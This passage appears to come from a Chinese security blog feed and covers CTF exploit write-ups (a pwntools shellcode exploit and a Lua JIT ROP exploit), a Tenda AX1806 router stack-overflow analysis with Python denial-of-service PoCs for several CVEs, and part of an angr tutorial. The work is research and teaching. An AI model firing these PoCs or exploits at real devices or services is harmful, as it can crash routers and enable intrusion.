punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># io = process("./pwn")</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'hash-it-0-m7tt7b7whagjw.shellweplayaga.me'</span><span class="token punctuation">,</span><span class="token string">'31337'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ticket please:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">r'ticket&#123;AweighWeatherdeck5640n22:Hh6YqvgvoHk_PVza-ImPd3f_mEkDjLd-JkzxVpPsFTlwjASB&#125;'</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x30000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(io,"b *$rebase(0x1213)")</span>    payload <span class="token operator">=</span> generation<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ca_shellcode()</span><span class="token comment"># second()</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092642291.png" alt="image-20220531092642291"></p><h1 id="smuggler’s-cove"><a href="#smuggler’s-cove" class="headerlink" title="smuggler’s cove"></a>smuggler’s cove</h1><p>这题比赛中没做出来，看 <a href="https://uz56764.tistory.com/55">大佬wp</a>复现的。之前在各种比赛中接触过这类型的题目，以往都是C写的JS解释器之类的东西，考察面向对象相关都漏洞点。但这次不同以往，本次比赛中我和队友卡在了Lua语言上，不知道Lua的数组还可以这么用，也没有去大胆的尝试，记录一下长个记性吧。</p><p>按照上面文章的说法，Lua的数组下标在存储的时候是使用双精度浮点数，在JIT过程中，我们输入的内容被转移到一个RX段中被执行。可以利用下标来构造一段ROP链，前提是将64位程序转为双精度浮点数：<a href="https://gregstoll.com/~gregstoll/floattohex/">在线转换网站</a>。本题因为是网页端的，所以在比赛时无法获取shell进行交互，需要执行题目给出的程序 <code>x marks the spot</code> 自动打印出flag。Lua脚本代码需要小于433，所以构造的ROP链非常有限，<code>jmp</code> 指令在短跳转时只占用两字节，因此可以用短跳转实现。</p><p>过程比较复杂，可以自行调试一下，exp如下：</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> s0 <span class="token operator">=</span> <span class="token string">"spot\x00the\x00marks\x00x\x00./dig_up_the_loot"</span>a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">5.818854254051108e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.2119828994673418e-188</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604507616872868e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069739006113e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069656115653e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069821896574e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604506949033473e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.0359661452274597e-212</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">5.92480351975e-313</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2.2373500568022293e-169</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2261634.5098039214</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>b <span class="token operator">=</span> arg<span class="token keyword">end</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">cargo</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tenda AX1806路由器多处栈溢出漏洞</title>
      <link href="/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/"/>
      <url>/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Tenda-AX1806路由器多处栈溢出漏洞"><a href="#Tenda-AX1806路由器多处栈溢出漏洞" class="headerlink" title="Tenda AX1806路由器多处栈溢出漏洞"></a>Tenda AX1806路由器多处栈溢出漏洞</h1><p>Tenda AX1806路由器固件版本 v1.0.0.1，存在多处栈溢出漏洞，漏洞点在 tdhttpd 二进制文件中，使用了危险函数 <code>strcpy</code> 前未对参数长度进行判断，导致拒绝服务漏洞。</p><h1 id="CVE信息"><a href="#CVE信息" class="headerlink" title="CVE信息"></a>CVE信息</h1><p>通过公布的漏洞编号，得知CVE编号为 CVE-2022-28971、CVE-2022-28972、CVE-2022-28970、CVE-2022-28969、CVE-2022-28973。在CVE网站中查询相关信息，得到漏洞相关信息，基本上都是溢出类漏洞：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155545109.png" alt="image-20220511155545109"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在官网下载固件（下载链接在文末），使用 binwalk 解包固件（需要用到ubi_reader），得到 ubifs 文件系统：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155440259.png" alt="image-20220511155440259"></p><p>查询收集CVE信息，得知漏洞点在于 <code>fromAdvSetMacMtuWan</code> 、<code>form_fast_setting_wifi_set</code> 、<code>fromSetIpMacBind</code>、<code>GetParentControlInfo</code>、<code>fromSetWifiGusetBasic</code> 函数中。</p><p>对于这种路由器系统来说，路由器一般都是通过 httpd 服务来运行路由器管理页面，用户在修改路由器配置时直接在管理页面上提交数据，交给 httpd 服务程序处理，所以可以在固件系统中查找 httpd 相关文件然后分析。使用 <code>grep -r httpd .</code> 命令在 .&#x2F;bin 文件夹下查找到一个 tdhttpd 可执行程序：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155514329-20220511155637583.png" alt="image-20220511155514329"></p><p>将 tdhttpd 放入IDA查看，ARM 32位小端，文件没有去掉符号，很容易分析。接下来分析上面提到的几个漏洞函数。<code>fromAdvSetMacMtuWan</code> 内调用函数 <code>sub_658D8</code>，<code>sub_658D8</code> 内字符串拷贝前未对输入参数做长度判断：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155659701.png" alt="image-20220511155659701"><code>form_fast_setting_wifi_set</code> 函数在处理 <code>timeZone</code> 参数时未对长度进行判断：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155721295.png" alt="image-20220511155721295"><code>fromSetIpMacBind</code> 就更离谱了，未对长度进行判断，无论如何都将内容拷贝到v20变量中：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155746366.png" alt="image-20220511155746366"></p><p><code>GetParentControlInfo</code> 函数在拷贝到堆块时未对长度进行判断，导致堆溢出：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155804517.png" alt="image-20220511155804517"></p><p><code>fromSetWifiGusetBasic</code> 函数也是没有判断参数长度直接进行拷贝：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155815123.png" alt="image-20220511155815123"></p><h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>使用 <code>sudo qemu-arm-static -L . ./bin/tdhttpd</code> 模拟运行固件，运行时监听了80端口，但无法访问页面：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155846796.png" alt="image-20220511155846796"></p><p>这个是因为IP地址不对，可以另起一个终端查看80端口的IP地址：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155913743.png" alt="image-20220511155913743"></p><p>这时候需要新建一个网桥：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uml-utilities bridge-utils<span class="token function">sudo</span> brctl addbr br0<span class="token function">sudo</span> brctl addif br0 ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 up<span class="token function">sudo</span> dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建网桥后除了本地网卡 ens33 以外多了一个 br0 网卡：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155926719.png" alt="image-20220511155926719"></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155935208.png" alt="image-20220511155935208"></p><p>然后安装 arm 环境的 libc，把 qemu-arm-static 拷贝到固件根文件夹下，再次运行 httpd 服务，就可以模拟成功并访问页面了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user-static libc6-arm* libc6-dev-arm*<span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-arm-static<span class="token variable">)</span></span> <span class="token builtin class-name">.</span><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155950195.png" alt="image-20220511155950195"></p><p>虽然能模拟部分页面，但是 Wi-Fi 功能是不能用的，因为 Wi-Fi 功能需要独立的硬件来支持，所以如果要测试 Wi-Fi 功能相关的接口，还是需要购买路由器才行。由于我是纯模拟，没有购买路由器，所以测试接口的时候参考了公布的PoC代码，这里模拟固件只是方便复现调试。Poc代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">CVE_2022_28970</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"mac"</span><span class="token punctuation">:</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/GetParentControlInfo>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28973</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"wanMTU"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/AdvSetMacMtuWan>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28969</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"shareSpeed"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/WifiGuestSet>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28971</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"list"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>        <span class="token string">b"bindnum"</span><span class="token punctuation">:</span> <span class="token string">b"1"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/SetIpMacBind>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28972</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"ssid"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token punctuation">,</span>        <span class="token string">b"timeZone"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b":"</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/fast_setting_wifi_set>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>CVE_2022_28971<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用 gdb-multiarch 来动态调试Poc，只需要在qemu运行时加上调试参数。qemu运行命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调试脚本如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"target remote :1234"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"python set_arch(<span class="token entity" title="\\">\\</span>"</span>arm<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token string">")"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"b *(<span class="token variable">$1</span>)"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行Poc，因为栈中返回地址被覆盖，最后会返回段错误信息，qemu 崩溃退出。但如果在实际过程中，路由器就已经宕机了：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511160007824.png" alt="image-20220511160007824"></p><p>因为是 <code>strcpy</code> 对字符串进行拷贝，遇到空字符会截断，所以无法构造地址进行利用，只能达到拒绝服务的攻击目的。</p><h1 id="漏洞修复思路"><a href="#漏洞修复思路" class="headerlink" title="漏洞修复思路"></a>漏洞修复思路</h1><p>总结下来就是使用危险函数 <code>strcpy</code> 前未对参数进行长度判断，导致栈溢出。可将 <code>strcpy</code> 函数替换为 <code>strncpy</code> 函数控制拷贝字符长度，或者在使用 <code>strcpy</code> 前对长度进行判断。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tenda.com.cn/download/detail-3306.html">AX1806 升级软件_腾达(Tenda)官方网站</a></p><p><a href="https://github.com/d1tto/IoT-vuln/tree/main/Tenda/AX1806">IoT-vuln&#x2F;Tenda&#x2F;AX1806 at main · d1tto&#x2F;IoT-vuln</a></p><p><a href="https://www.anquanke.com/post/id/204326">写给初学者的IoT实战教程之ARM栈溢出</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr入门(二)</title>
      <link href="/2022/05/01/angr-ru-men-er/"/>
      <url>/2022/05/01/angr-ru-men-er/</url>
      
        <content type="html"><![CDATA[<p>有了上一篇 <a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angr入门</a> 的铺垫后，现在学习一下 angr 如何给指定内存地址赋值。</p><h1 id="Part-4-angr-symbolic-memory"><a href="#Part-4-angr-symbolic-memory" class="headerlink" title="Part 4 angr symbolic memory"></a>Part 4 angr symbolic memory</h1><p>这次以一个例题来学习如何在 angr 中设置指定地址的值。用 IDA 打开 05_angr_symbolic_memory 文件，查看函数逻辑。依然是使用 <code>scanf</code> 函数读取输入，输入的内容放入了全局变量的四个地址中，可以观察到这个地址并非常规的 bss 段地址，而是一个自定义的内存地址，随后使用 <code>complex_function</code> 对输入的内容进行处理，最后需要和给出的字符串相同：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501103834228.png" alt="image-20220501103834228"></p><p>根据之前学习过的 angr 使用方法，可以在 <code>scanf</code> 函数之后符号执行，但是这里有了四个指定的内存地址，需要使用它们进行求解。查看 scaffold05.py 内容如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> ???<span class="token punctuation">)</span>    password0_address <span class="token operator">=</span> ???  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相同代码部分就不详细赘述了，有不清楚的地方可以参考前面<a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angr入门</a> 。主要看看  <code>  initial_state.memory.store(password0_address, password0)</code> ，可以把向量值 <code>password0</code> 存储到指定的地址 <code>password0_address</code> 中。我们现在已知的四个地址为 0x0A1BA1C0、0x0A1BA1C8、0x0A1BA1D0、0x0A1BA1D8 ，那么就需要创建四个向量值以此传入。最后直接看修改后的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token 